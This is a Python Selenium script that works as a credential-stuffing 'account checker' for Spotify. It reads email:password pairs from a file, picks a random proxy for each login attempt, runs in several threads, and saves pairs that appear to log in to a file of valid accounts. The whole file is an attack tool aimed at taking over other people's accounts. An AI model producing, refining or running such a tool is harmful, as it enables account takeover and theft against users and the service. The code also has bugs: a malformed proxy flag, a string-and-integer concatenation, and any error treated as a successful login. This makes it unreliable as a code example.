from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.desired_capabilities import DesiredCapabilities
import random
import time
import threading
import sys
from colorama import Fore, Style
from colorama import init, AnsiToWin32



init(wrap=False)
stream = AnsiToWin32(sys.stderr).stream

admin = Fore.CYAN + "System: "
err = Fore.RED + "System Error: "
warn = Fore.YELLOW + "System Warn: "
#print(admin, Fore.WHITE + "Enter the file name containing account (with .txt): ")
#account_list = input(Fore.GREEN + "==> ")
print(Style.RESET_ALL)

def autoChecking():
    
    try:
        with open("./acc.txt", 'r', encoding="utf8") as f:
            lines = f.readlines()
            rangeLines = len(lines)
    except:
        print(err, Fore.RED + "Please check the attachment file!")
        print(Style.RESET_ALL)
        
    
    
    for acc in range(rangeLines):
        
        #call webdrive and add proxy
        with open("proxy.txt", "r") as f:
            linesPr = f.readlines()
            proxy = random.choice(linesPr)
        
        url = 'https://accounts.spotify.com/en/login'
        
        capabilities = DesiredCapabilities.CHROME
        capabilities["goog:loggingPrefs"] = {"performance": "ALL"}
        options = webdriver.ChromeOptions()
        #options.add_extension("SessionBoxMulti-login-to-any-website.crx")
        options.add_argument("--> Proxy server: %s" %proxy)
        options.add_experimental_option('excludeSwitches', ['enable-logging'])
        driver = webdriver.Chrome(options=options, desired_capabilities=capabilities)
        
        
        try:
            data = str(lines[acc])
            
            #get data form text file   
            
            print("*  *  *  *  *  *  *  *  *  *  *  *")

            count = acc + 1
            print(admin, Fore.BLUE + "Action Count: ", Fore.BLUE + str(count))
            print(Style.RESET_ALL)
            
            # import account
            def getGmail():
                if data is None:
                    print(err, Fore.RED + " Can't get email from data!\n \tPlease check the input data again! ")
                    print(Style.RESET_ALL)
                else:
                    gmail = data.split(":")[0]
                    print(admin, Fore.GREEN + "Get Email Successfully!")
                    print(Style.RESET_ALL)
                return gmail

            def getPassword():
                if data is None:
                    print(err, Fore.RED + " Can't get password from data!\n \tPlease check the input data again! ")
                    print(Style.RESET_ALL)
                else:
                    get_password = data.split(":")[1]
                    #password = get_password.split(" ")[0]
                    print(admin, Fore.GREEN + "Get Password Successfully!")
                    print(Style.RESET_ALL)
                return get_password

            mail = getGmail()
            pwd = getPassword() 

            #main code
            driver.get(url)

            def main():
                
                #login
                def login():
                    try:
                        elem = driver.find_element(By.ID, 'login-username')
                        elem.send_keys(mail)
                        elempass = driver.find_element(By.ID, 'login-password')
                        elempass.send_keys(pwd)
                        driver.find_element(By.CSS_SELECTOR, "div.sc-llYSUQ.bhDhtg div.sc-giYglK.ggrwSq div.sc-ezbkAF.gEKFis div.sc-gsDKAQ.kdQBSg div.sc-crHmcD.fbmdeN:nth-child(4) div.sc-egiyK.fNmxwU button.Button-qlcn5g-0.frUdWl div.ButtonInner-sc-14ud5tc-0.lbsIMA.encore-bright-accent-set > p.Type__TypeElement-goli3j-0.dmuHFl.sc-hKwDye.eKDPqH").click()

                        time.sleep(5)
                        elemErr = driver.find_element(By.CSS_SELECTOR, '#root > div > div.sc-giYglK.ggrwSq > div > div > div.Wrapper-sc-62m9tu-0.dupjdh.encore-negative-set.sc-bqiRlB.hdPVpG > span')
                        get_err = elemErr.text
                        if get_err == "Oops! Something went wrong, please try again or check out our help area" or get_err == "Incorrect username or password.":
                            print(err, Fore.RED + "This Account is invalid!")
                            print(Style.RESET_ALL)
                        else:
                            print(err, Fore.RED + "Can't login, try again!")
                            print(Style.RESET_ALL)                         
                    except:
                        action_count = 1
                        account_vailid_count = action_count + 1
                        file = open("vailid.txt", "a+")
                        file.write(mail + ":" + pwd)
                        print(admin, Fore.GREEN + "Account is vailid!")
                        print(admin, Fore.GREEN + "Number of available account: " + account_vailid_count)
                        print(Style.RESET_ALL)
                login()
                
                # checking account
            main()

            driver.close()
        except:
            print(err, Fore.RED + " Please do not close the running browser or\n\t\tCheck the data in the attached file")
            print(Style.RESET_ALL)
            driver.close()
            
# run multithread

num_threads = int(input("Enter number of threads: "))
threads = []

for i in range(num_threads):
    t = threading.Thread(target=autoChecking)
    threads.append(t)

for t in threads:
    t.start()

for t in threads:
    t.join()

